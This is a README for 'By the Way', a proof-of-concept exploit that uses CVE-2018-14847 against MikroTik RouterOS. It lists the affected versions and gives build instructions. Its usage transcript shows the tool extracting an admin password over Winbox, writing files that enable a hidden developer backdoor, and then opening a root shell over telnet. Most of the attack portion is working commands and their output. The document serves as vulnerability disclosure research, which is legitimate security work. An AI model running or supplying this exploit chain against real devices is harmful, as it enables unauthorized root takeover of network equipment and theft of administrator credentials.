# By the Way

By the Way is an exploit that enables a root shell on Mikrotik devices running RouterOS versions:

* Longterm: 6.30.1 - 6.40.7
* Stable: 6.29 - 6.42
* Beta: 6.29rc1 - 6.43rc3

The exploit leverages the path traversal vulnerability CVE-2018-14847 to extract the admin password and create an "option" package to enable the developer backdoor. Post exploitation the attacker can connect to Telnet or SSH using the root user "devel" with the admin's password.

Mikrotik patched CVE-2018-14847 back in April. However, until this PoC was written, I don't believe its been publicly disclosed that the attack can be levegered to write files. You can find Mikrotik's advisory here:

* https://blog.mikrotik.com/security/winbox-vulnerability.html

Note that, while this exploit is written for Winbox, it could be ported to HTTP as long as you had prior knowledge of the admin credentials.

## Dependencies
This PoC relies on:

* Boost
* pthread
* cmake

## Build Insturctions

```sh
albinolobster@ubuntu:~/mikrotik$ cd poc/bytheway/
albinolobster@ubuntu:~/mikrotik/poc/bytheway$ mkdir build
albinolobster@ubuntu:~/mikrotik/poc/bytheway$ cd build/
albinolobster@ubuntu:~/mikrotik/poc/bytheway/build$ cmake ..
-- The C compiler identification is GNU 7.3.0
-- The CXX compiler identification is GNU 7.3.0
-- Check for working C compiler: /usr/bin/cc
-- Check for working C compiler: /usr/bin/cc -- works
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Detecting C compile features
-- Detecting C compile features - done
-- Check for working CXX compiler: /usr/bin/c++
-- Check for working CXX compiler: /usr/bin/c++ -- works
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Boost version: 1.65.1
-- Found the following Boost libraries:
--   program_options
--   system
--   regex
-- Configuring done
-- Generating done
-- Build files have been written to: /home/albinolobster/mikrotik/poc/bytheway/build
albinolobster@ubuntu:~/mikrotik/poc/bytheway/build$ make
Scanning dependencies of target btw
[ 20%] Building CXX object CMakeFiles/btw.dir/src/main.cpp.o
[ 40%] Building CXX object CMakeFiles/btw.dir/home/albinolobster/mikrotik/common/md5.cpp.o
[ 60%] Building CXX object CMakeFiles/btw.dir/home/albinolobster/mikrotik/common/winbox_session.cpp.o
[ 80%] Building CXX object CMakeFiles/btw.dir/home/albinolobster/mikrotik/common/winbox_message.cpp.o
[100%] Linking CXX executable btw
[100%] Built target btw
albinolobster@ubuntu:~/mikrotik/poc/bytheway/build$ 
```

## Usage Example

```sh
albinolobster@ubuntu:~/mikrotik/poc/bytheway/build$ telnet -l devel 192.168.1.251
Trying 192.168.1.251...
Connected to 192.168.1.251.
Escape character is '^]'.
Password: 
Login failed, incorrect username or password

Connection closed by foreign host.
albinolobster@ubuntu:~/mikrotik/poc/bytheway/build$ ./btw -i 192.168.1.251

   ╔╗ ┬ ┬  ┌┬┐┬ ┬┌─┐  ╦ ╦┌─┐┬ ┬
   ╠╩╗└┬┘   │ ├─┤├┤   ║║║├─┤└┬┘
   ╚═╝ ┴    ┴ ┴ ┴└─┘  ╚╩╝┴ ┴ ┴ 

[+] Extracting passwords from 192.168.1.251:8291
[+] Searching for administrator credentials 
[+] Using credentials - admin:lol
[+] Creating /pckg/option on 192.168.1.251:8291
[+] Creating /flash/nova/etc/devel-login on 192.168.1.251:8291
[+] There's a light on
albinolobster@ubuntu:~/mikrotik/poc/bytheway/build$ telnet -l devel 192.168.1.251
Trying 192.168.1.251...
Connected to 192.168.1.251.
Escape character is '^]'.
Password: 


BusyBox v1.00 (2017.03.02-08:29+0000) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

# uname -a
Linux MikroTik 3.3.5 #1 Thu Mar 2 08:16:25 UTC 2017 mips unknown
# cat /rw/logs/VERSION
v6.38.4 Mar/08/2017 09:26:17
# Connection closed by foreign host.
```

